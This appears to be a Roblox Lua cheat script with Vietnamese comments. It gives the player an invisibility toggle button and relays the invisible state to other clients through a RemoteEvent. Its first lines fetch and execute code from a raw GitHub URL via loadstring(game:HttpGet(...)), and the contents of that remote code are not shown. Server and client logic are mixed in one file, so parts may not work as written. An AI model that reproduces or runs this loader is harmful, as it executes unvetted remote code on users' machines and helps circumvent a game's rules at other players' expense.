-- Tàng hình tuyệt đối + chạy script GitHub khác

-- Chạy thêm script GitHub của bạn
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/vinh12eqweaws/vvvs/refs/heads/main/caz"))()
end)

-- Tạo RemoteEvent cho tàng hình
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local toggleEvent = ReplicatedStorage:FindFirstChild("ToggleInvisibility") or Instance.new("RemoteEvent")
toggleEvent.Name = "ToggleInvisibility"
toggleEvent.Parent = ReplicatedStorage

-- Server handler
if not _G.InvisibleServerSetup then
    _G.InvisibleServerSetup = true
    toggleEvent.OnServerEvent:Connect(function(player, state)
        for _, otherPlayer in pairs(game.Players:GetPlayers()) do
            if otherPlayer ~= player then
                toggleEvent:FireClient(otherPlayer, player, state)
            end
        end
    end)
end

-- LocalScript phần tàng hình
if game:GetService("Players").LocalPlayer then
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()

    -- GUI nút
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 180, 0, 60)
    button.Position = UDim2.new(1, -200, 1, -80)
    button.Text = "Bật Tàng Hình"
    button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Font = Enum.Font.SourceSansBold
    button.TextSize = 18
    button.Parent = screenGui

    -- Viền đổi màu liên tục
    local uiStroke = Instance.new("UIStroke")
    uiStroke.Parent = button
    uiStroke.Thickness = 3

    task.spawn(function()
        local hue = 0
        while button.Parent do
            hue = (hue + 1) % 360
            uiStroke.Color = Color3.fromHSV(hue / 360, 1, 1)
            task.wait(0.05)
        end
    end)

    -- Cho kéo nút
    button.Active = true
    button.Draggable = true

    local isInvisible = false

    -- Hàm ẩn/hiện local
    local function setLocalInvisible(state)
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA("BasePart") or part:IsA("Decal") then
                part.Transparency = state and 1 or 0
            end
        end
    end

    -- Khi bấm nút
    button.MouseButton1Click:Connect(function()
        isInvisible = not isInvisible
        setLocalInvisible(isInvisible)
        toggleEvent:FireServer(isInvisible)
        button.Text = isInvisible and "Tắt Tàng Hình" or "Bật Tàng Hình"
    end)

    -- Khi nhận lệnh từ server → ẩn/hiện người khác
    toggleEvent.OnClientEvent:Connect(function(targetPlayer, state)
        local char = targetPlayer.Character
        if char then
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") or part:IsA("Decal") then
                    part.Transparency = state and 1 or 0
                end
            end
        end
    end)

    -- Giữ trạng thái khi respawn
    player.CharacterAdded:Connect(function(newChar)
        character = newChar
        if isInvisible then
            setLocalInvisible(true)
            toggleEvent:FireServer(true)
        end
    end)
end
